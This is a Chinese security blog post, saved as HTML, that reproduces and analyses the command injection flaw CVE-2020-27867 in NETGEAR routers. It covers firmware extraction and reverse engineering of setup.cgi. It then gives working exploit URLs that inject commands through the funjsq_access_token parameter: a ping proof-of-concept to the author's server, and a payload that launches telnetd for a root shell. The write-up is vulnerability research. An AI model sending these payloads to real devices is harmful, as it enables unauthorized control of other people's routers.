

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="MIPS 大法好">
<meta property="og:type" content="article">
<meta property="og:title" content="【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析">
<meta property="og:url" content="http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="MIPS 大法好">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/08/21/avRNSBKC2YszMUW.png">
<meta property="article:published_time" content="2021-08-17T03:50:50.000Z">
<meta property="article:modified_time" content="2021-11-12T19:41:12.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="Netgear">
<meta property="article:tag" content="Remote Code Execute">
<meta property="article:tag" content="Command Injection">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/08/21/avRNSBKC2YszMUW.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析 - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/08/21/LvBZTUi3R9l6Ish.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-08-17 11:50" pubdate>
          2021年8月17日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          41 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2021年11月13日 凌晨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p><s>MIPS 大法好</s></p>
<span id="more"></span>
<p>MIPS 太憨憨了，还是 X86 好（恼）</p>
<h1>0x00.一切开始之前</h1>
<blockquote>
<p>以下都是废话233333</p>
</blockquote>
<p><strong>美国网件公司</strong>（<strong>NETGEAR</strong>）是一家专门做网络设备的公司。在2020年末其旗下多款路由器产品被爆出存在远程代码执行漏洞——mini_httpd 服务中对其提供的<strong>帆游加速器</strong>功能的参数解析存在缺陷从而导致可以进行命令注入，从而在远程主机执行任意代码——虽然此种利用需要身份验证，但据悉现有的身份验证机制并不难绕过</p>
<p>在 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27867">cve.mitre.org</a> 上对该漏洞说明如下：</p>
<blockquote>
<p>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.</p>
</blockquote>
<h2 id="影响版本">影响版本</h2>
<p>参见<a target="_blank" rel="noopener" href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers">官网</a></p>
<h2 id="复现环境搭建">复现环境搭建</h2>
<p>笔者本人比较穷，买不起网件的路由器（哭哭），但最终还是有幸从朋友那借来了一台 R6800 机器，得以对该漏洞进行复现</p>
<p><img src="https://i.loli.net/2021/08/20/8hxInwiBy1zQHjb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>前面这几百字讲了一堆废话倒是真的hhhh</p>
</blockquote>
<h1>0x01.漏洞分析</h1>
<h2 id="文件提取">文件提取</h2>
<p>首先在<a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/R6800.aspx#Firmware%20Version%201.2.0.74">官网</a>下载对应版本（1.2.0.74）的固件，解压后得到一个 img 镜像文件</p>
<p>使用 binwalk 提取其中的内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">binwalk -e</span> <br></code></pre></td></tr></table></figure>
<p>得到两个文件 <code>200.zip </code> 和 <code>R6950.bin</code>，其中前者为后者的压缩包，继续使用 binwalk 解压后者，得到的 <code>squashfs-root</code> 文件夹便是该设备的文件系统</p>
<p>在文件系统中有着大量的软链接，大部分最终都是指向 <code>usr/sbin</code> 目录，相应地 <code>init</code> 进程指向的是 <code>usr/sbin/busybox</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 84<br>drwxr-xr-x 12 arttnba3 arttnba3  4096 Aug 18 20:14 ./<br>drwxrwxr-x  3 arttnba3 arttnba3  4096 Aug 18 20:56 ../<br>lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 bin -&gt; usr/sbin//<br>drwxrwxr-x  2 arttnba3 arttnba3  4096 Aug 15  2015 data/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Oct 18  2015 dev/<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 etc -&gt; /tmp/etc<br>lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 etc_ro -&gt; /tmp/etc_ro<br>lrwxrwxrwx  1 arttnba3 arttnba3    20 Aug 17  2020 home -&gt; /tmp/home_directory/<br>lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 init -&gt; bin/busybox*<br>drwxr-xr-x  6 arttnba3 arttnba3 12288 Aug 17  2020 lib/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Dec  2  2012 media/<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 mnt -&gt; /tmp/mnt<br>drwxrwxr-x  6 arttnba3 arttnba3  4096 Aug 17  2020 opt/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 12  2000 proc/<br>lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 sbin -&gt; usr/sbin//<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 16  2008 sys/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Jul 28  2000 tmp/<br>drwxr-xr-x 11 arttnba3 arttnba3  4096 Aug 18 18:59 usr/<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 var -&gt; /tmp/var<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 www -&gt; /tmp/www<br>drwxrwxr-x  8 arttnba3 arttnba3 32768 Aug 17  2020 www.eng/<br></code></pre></td></tr></table></figure>
<p>在 <code>usr</code> 目录下还有一个文件 <code>funjsq_plugin_netgear_r6800.tar.gz</code>，解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf funjsq_plugin_netgear_r6800.tar.gz</span><br>./tmp/<br>./tmp/funjsq/<br>./tmp/funjsq/bin/<br>./tmp/funjsq/bin/funjsq_cli<br>./tmp/funjsq/bin/funjsq_ctl<br>./tmp/funjsq/bin/funjsq_nslookup<br>./tmp/funjsq/bin/funjsq_conntime<br>./tmp/funjsq/bin/funjsq_daemon<br>./tmp/funjsq/bin/funjsq_detect<br>./tmp/funjsq/bin/funjsq_dns<br>./tmp/funjsq/bin/funjsq_httpd<br>./tmp/funjsq/bin/funjsq_inetd<br>./tmp/funjsq/bin/funjsq_redis<br>./tmp/funjsq/bin/funjsq.sh<br>./tmp/funjsq/config/<br>./tmp/funjsq/config/dnsmasq.d/<br>./tmp/funjsq/config/dnsmasq.d/funjsq101.conf<br>./tmp/funjsq/config/dnsmasq.d/blocklistDL.conf<br>./tmp/funjsq/config/dnsmasq.d/blocklistGW.conf<br>./tmp/funjsq/config/dnsmasq.d/funjsq100.conf<br>./tmp/funjsq/config/values/<br>./tmp/funjsq/config/funjsqdetect.dat<br>./tmp/funjsq/config/funjsqMSG.json<br>./tmp/funjsq/config/funjsq_ca<br>./tmp/funjsq/config/httpd/<br>./tmp/funjsq/config/httpd/key.pem<br>./tmp/funjsq/config/httpd/cert.pem<br></code></pre></td></tr></table></figure>
<h2 id="程序分析">程序分析</h2>
<p>在漏洞通告中说到该漏洞存在于 <code>mini_httpd</code> 服务中</p>
<p><img src="https://i.loli.net/2021/08/20/SXIgiqxByhKYQMr.png" srcset="/img/loading.gif" lazyload alt="img.png"></p>
<p>用 <code>burp suite</code>简单测试一下我们可以发现大部分 http 请求都是通过 <code>setup.cgi</code> 来进行的，该文件存在于 <code>/usr/sbin/</code> 目录下</p>
<p><img src="https://i.loli.net/2021/08/20/XdMjNzGWLQU19HY.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>拖入 IDA进行分析，查找 <code>funjsq_access_token</code> 字符串</p>
<p><img src="https://i.loli.net/2021/08/23/SKiMvXBaIEN4Wmc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>XREF 到 <code>sub_407C80()</code> 函数，其中会通过 <code>find_val()</code> 函数提取出 <code>funjsq_access_token</code> 参数，进行命令拼接后通过 <code>COMMAND()</code>（本质上其实就是 sh）执行，我们不难想到的是<strong>若是能够插入诸如 &quot;;&quot; 或者 &quot;&amp;&amp;&quot; 这样的分隔符等，便能够执行我们想要执行的命令，即存在一个命令注入的 RCE 漏洞</strong></p>
<p><img src="https://i.loli.net/2021/08/20/m5fCVtKqwzlQBsj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>调用回溯，发现一张如下结构的函数表，我们的 <code>sub_407C80()</code> 刚好对应 <code>funjsq_login</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">typedef</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * func_name;<br>    <span class="hljs-type">void</span> (*func_ptr)();<br>&#125;StrFunc;<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/08/20/uWcTf9iBQneAkaL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们可以发现在 <code>CallActionByName()</code> 函数中会根据传入的字符串通过函数表调用对应的函数</p>
<p><img src="https://i.loli.net/2021/08/20/Gbphgm5K9OJCM2R.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>最后回溯到 main 函数，我们可以发现对于传入的 todo 参数而言其会调用 <code>CallActionByName()</code> 函数进行解析</p>
<p><img src="https://i.loli.net/2021/08/20/dhx4v6E2DR9PLaf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在 main 函数中执行到该段代码之前还有一系列的检查，不过<strong>主要针对 POST 请求</strong>，故我们可以直接走 GET 请求来避免一系列的检查</p>
<p>最终我们可以知道通过如下 payload 便能够跳转到出现问题的 <code>sub_407C80()</code> 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=<br></code></pre></td></tr></table></figure>
<blockquote>
<p>在 <code>find_val()</code> 中还会对命令注入进行过滤，不过功能较弱<img src="https://i.loli.net/2021/08/20/L9VZUiDAlJcme1v.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<h1>0x02.漏洞利用</h1>
<p><strong>该漏洞仅验证用户（可以登入路由器页面）可以使用</strong>，常规情况下则还需要想方法绕过用户验证</p>
<blockquote>
<p>刚开始学web，这个真不会…先把二进制的部分（本漏洞）整好先…</p>
</blockquote>
<h2 id="poc">poc</h2>
<p>在 mini_httpd 服务中似乎<strong>有着一定的过滤的机制</strong>，诸如 <code>;</code>、<code>&amp;&amp;</code>、<code>||</code>等都会被过滤掉，直接返回 403</p>
<p><img src="https://i.loli.net/2021/08/20/XFigLkICoSzARhW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>最终笔者使用<code>|</code><strong>成功绕过</strong>，笔者在这里选择执行 <code>ping</code> 指令简单看一下效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|ping%20-c5%20sec.arttnba3.cn<br></code></pre></td></tr></table></figure>
<p>若是成功进入执行命令的流程则应当有如下回显，见到这个回显说明代码成功执行到了该处</p>
<p><img src="https://i.loli.net/2021/08/20/2pYtRXjylSdGo1B.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/20/AfZ6pSCdoBI1qUe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>笔者使用 <code>tcpdump -i eth0 icmp</code> 命令在服务器上查看发现果然成功收到了来自该路由器的 ping 包，命令执行成功</p>
<p><img src="https://i.loli.net/2021/08/20/qKhQGyHNmUOSkIP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>需要注意的是 <code>COMMAND()</code> 执行命令时会等待其返回才会执行下一条命令，故若是需要同时执行多个命令应当使用 <code>&amp;</code>（url编码<code>%26</code>）将一些长期执行的命令转入后台执行，否则其会一直等待当前命令执行完毕后才会执行下一条命令</p>
<blockquote>
<p>刚拿到命令执行时我执行了 <code>ping my_server_address</code>，没有限制次数，导致后续命令都卡在了 ping 后边没法执行，最后我和学长在公司看了四分之一个下午才发现这个玄学问题的成因…</p>
</blockquote>
</blockquote>
<h2 id="exp">exp</h2>
<p>这台机子自带 <code>telnet</code>，直接通过 telnet 连接上去即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|utelnetd%26<br></code></pre></td></tr></table></figure>
<p>运行，成功通过 telnet 连接获取到一个 shell</p>
<p><img src="https://i.loli.net/2021/08/20/T6Su8JLI9fOadA5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/20/RYA3cqHGdZstXiC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1>0xFF.What’s more…</h1>
<p>在后续官方给出的新版本固件中虽然修复了该漏洞，<strong>但是没有完全修复，使得其成为了简中特供漏洞</strong></p>
<blockquote>
<p>下图来自微博 <code>@blackorbird</code></p>
<blockquote>
<p>是你🦄 @BlackBird</p>
</blockquote>
</blockquote>
<p><img src="https://i.loli.net/2021/08/20/SxIkKvolHE6Od1B.jpg" srcset="/img/loading.gif" lazyload alt="img.JPG"></p>
<blockquote>
<p>漏洞细节暂时不能讲，感兴趣的也不推荐私信我hhhhhh</p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/CVE/">#CVE</a>
      
        <a href="/tags/Netgear/">#Netgear</a>
      
        <a href="/tags/Remote-Code-Execute/">#Remote Code Execute</a>
      
        <a href="/tags/Command-Injection/">#Command Injection</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析</div>
      <div>http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2021年8月17日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/" title="【PIECES.0x01】Shell之外的往事：夏天的风">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">【PIECES.0x01】Shell之外的往事：夏天的风</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/10/CVE-0X03-CVE-2016-6909/" title="【CVE.0x03】CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析">
                        <span class="hidden-mobile">【CVE.0x03】CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- 网站运行时间的设置 -->
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
